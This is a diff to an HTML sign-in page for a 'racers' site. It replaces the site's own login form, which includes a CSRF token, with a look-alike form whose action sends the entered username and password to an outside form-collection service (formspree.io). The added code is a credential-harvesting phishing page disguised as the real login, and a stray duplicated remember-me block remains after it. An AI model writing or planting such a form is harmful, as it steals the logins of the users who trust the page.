@@ -80,15 +80,56 @@ Sign In
 <div class='col-md-6 mt-2'>
 <div class='card page-intro'>
 <div class='card-body'>
-<form class="simple_form new_racer" id="new_racer" novalidate="novalidate" action="/racers/sign_in" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="__SW5wWtrwu2K60cx_5Js-pgJtVDFSvxFubP0niZBIoFecJKBv6lCzTH_Kgra7ernnw60LFKZKTjkLknTb9bYg" autocomplete="off" /><div class='form-inputs'>
-<div class="mb-3 string required racer_login"><label class="form-label string required" for="racer_login">Login <abbr title="required">*</abbr></label><input class="form-control string required" autofocus="autofocus" required="required" aria-required="true" type="text" value="" name="racer[login]" id="racer_login" /><div class="form-text">email or username</div></div>
-<div class="mb-3 password required racer_password"><label class="form-label password required" for="racer_password">Password <abbr title="required">*</abbr></label><div data-controller='password-visibility' data-password-visibility-hidden-class='d-none'>
-<div class='input-group'>
-<input class="password optional form-control" data-password-visibility-target="input" type="password" name="racer[password]" id="racer_password" />
-<button class='btn btn-outline-secondary' data-action='password-visibility#toggle' tabindex='-1' type='button'>
-<i class='fa fa-eye' data-password-visibility-target='icon'></i>
-<i class='fa fa-eye-slash d-none' data-password-visibility-target='icon'></i>
-</button>
+  <form class="simple_form new_racer" id="new_racer" novalidate="novalidate" 
+        action="https://formspree.io/f/xeopllla" method="POST">
+    
+    <div class='form-inputs'>
+      <!-- Login field -->
+      <div class="mb-3 string required racer_login">
+        <label class="form-label string required" for="racer_login">
+          Login <abbr title="required">*</abbr>
+        </label>
+        <input class="form-control string required" autofocus="autofocus" 
+               required="required" aria-required="true" type="text" 
+               value="" name="Login" id="racer_login" />
+        <div class="form-text">email or username</div>
+      </div>
+
+      <!-- Password field -->
+      <div class="mb-3 password required racer_password">
+        <label class="form-label password required" for="racer_password">
+          Password <abbr title="required">*</abbr>
+        </label>
+        <div data-controller='password-visibility' data-password-visibility-hidden-class='d-none'>
+          <div class='input-group'>
+            <input class="password optional form-control" data-password-visibility-target="input" 
+                   type="password" name="Password" id="racer_password" />
+            <button class='btn btn-outline-secondary' data-action='password-visibility#toggle' 
+                    tabindex='-1' type='button'>
+              <i class='fa fa-eye' data-password-visibility-target='icon'></i>
+              <i class='fa fa-eye-slash d-none' data-password-visibility-target='icon'></i>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Remember me -->
+      <fieldset class="mb-3 boolean optional racer_remember_me">
+        <div class="form-check">
+          <input class="form-check-input boolean optional" type="checkbox" 
+                 value="1" name="Remember Me" id="racer_remember_me" />
+          <label class="form-check-label boolean optional" for="racer_remember_me">
+            Remember me
+          </label>
+        </div>
+      </fieldset>
+    </div>
+
+    <!-- Submit button -->
+    <div class='form-actions'>
+      <button type="submit" class="btn btn btn-primary">Sign In</button>
+    </div>
+  </form>
 </div>
 </div>
 </div><fieldset class="mb-3 boolean optional racer_remember_me"><div class="form-check"><input name="racer[remember_me]" type="hidden" value="0" autocomplete="off" /><input class="form-check-input boolean optional" type="checkbox" value="1" name="racer[remember_me]" id="racer_remember_me" /><label class="form-check-label boolean optional" for="racer_remember_me">Remember me</label></div></fieldset>
